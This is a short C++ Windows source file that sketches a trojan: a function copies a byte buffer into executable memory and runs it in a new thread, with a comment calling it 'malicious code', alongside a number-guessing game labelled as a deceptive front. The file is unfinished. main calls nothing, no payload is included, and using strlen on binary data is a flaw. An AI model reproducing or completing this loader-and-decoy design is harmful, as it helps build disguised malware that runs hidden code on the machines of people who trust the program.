#include <iostream>
#include <windows.h>

void runBinaryInMemory(const char* binaryData)
{
  //Allocating space for executable in memory
  const size_t dataSize = strlen(binaryData);
  LPVOID exeBuffer = VirtualAlloc(0, dataSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
  memcpy(exeBuffer, binaryData, dataSize);
  
  //Create thread to run with program
  HANDLE thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exeBuffer, 0, 0, 0);
  
  //Run malicious code in background
  WaitForSingleObject(thread, INFINITE);
  CloseHandle(thread);

  VirtualFree(exeBuffer, 0, MEM_RELEASE);
}

void desceptiveFront(const char* binaryData)
{
  int num = 0;
  std::cout << "Welcome! please guess a number between 1-10: ";
  std::cin >> num;
  if(num == 2)
    std::cout << "Congrats! You guessed it :)";
  else
   std::cout << "That's not the number, try again.";

}


int main(int argc, char** argv)
{
  //desceptiveFront();
  return 0;
}

